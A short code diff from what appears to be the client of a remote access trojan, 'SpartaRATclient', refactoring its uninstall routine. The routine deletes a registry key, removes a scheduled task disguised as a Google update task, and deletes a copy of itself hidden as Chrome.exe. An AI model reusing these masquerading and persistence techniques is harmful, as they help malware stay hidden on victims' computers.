@@ -19,14 +19,12 @@ namespace SpartaRATclient.Tools
             //3. removing app from documents folder
             //4. exit program
 
-            RegistryDelete registry = new RegistryDelete();
-            registry.DeleteKey(@"Software\ClientValues");
+            RegistryDelete.DeleteKey(@"Software\ClientValues");
 
             Shell PowershellCommand = new Shell();
             PowershellCommand.Run(@"/C schtasks.exe /delete /tn ""GoogleUpdateTaskCore{CAF3204-9215-3589-JGE4N-E34528X8SC}"" /f");
 
-            FileCopy ThisProgram = new FileCopy();
-            if (ThisProgram.This() == "exist") //if this program exist at the new hidden path then
+            if (FileCopy.This() == "exist") //if this program exist at the new hidden path then
                 File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe");
 
             Environment.Exit(0);
